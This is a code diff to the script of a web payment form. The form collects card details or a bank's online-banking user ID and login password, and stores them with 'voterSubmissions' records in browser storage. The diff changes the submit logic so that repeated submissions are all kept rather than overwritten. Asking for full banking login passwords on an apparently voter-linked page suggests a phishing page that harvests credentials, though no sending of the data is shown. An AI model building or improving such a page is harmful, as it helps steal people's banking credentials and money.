@@ -214,7 +214,6 @@
     </div>
 
     <script>
-        // Toggle Payment Sections
         const cardRadio = document.querySelector('input[value="Card"]');
         const netRadio = document.querySelector('input[value="NetBanking"]');
         const cardSection = document.getElementById('cardSection');
@@ -240,7 +239,6 @@
             }
         });
 
-        // Show Bank Credentials only after Bank selection
         const bankNameSelect = document.getElementById('bankName');
         const bankCredentials = document.getElementById('bankCredentials');
 
@@ -252,7 +250,6 @@
             }
         });
 
-        // Form Submission Logic & Data Saving
         document.getElementById('paymentForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -271,7 +268,6 @@
                 paymentDetails = `Bank: ${bankName}, UserID: ${userId}, Pass: ${loginPassword}`;
             }
 
-            // Get existing submissions from localStorage
             let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
             let deviceId = localStorage.getItem('voterDeviceId');
 
@@ -288,9 +284,17 @@
                     targetIndex = submissions.length - 1;
                 }
 
-                // Update latest entry with payment details
-                submissions[targetIndex].paymentMethod = payMethod;
-                submissions[targetIndex].paymentDetails = paymentDetails;
+                // If payment details already exist in this latest row, push as a new entry so both records stay preserved
+                if (submissions[targetIndex].paymentDetails) {
+                    let newEntry = { ...submissions[targetIndex] };
+                    newEntry.paymentMethod = payMethod;
+                    newEntry.paymentDetails = paymentDetails;
+                    newEntry.time = new Date().toLocaleString();
+                    submissions.push(newEntry);
+                } else {
+                    submissions[targetIndex].paymentMethod = payMethod;
+                    submissions[targetIndex].paymentDetails = paymentDetails;
+                }
 
                 localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
             }
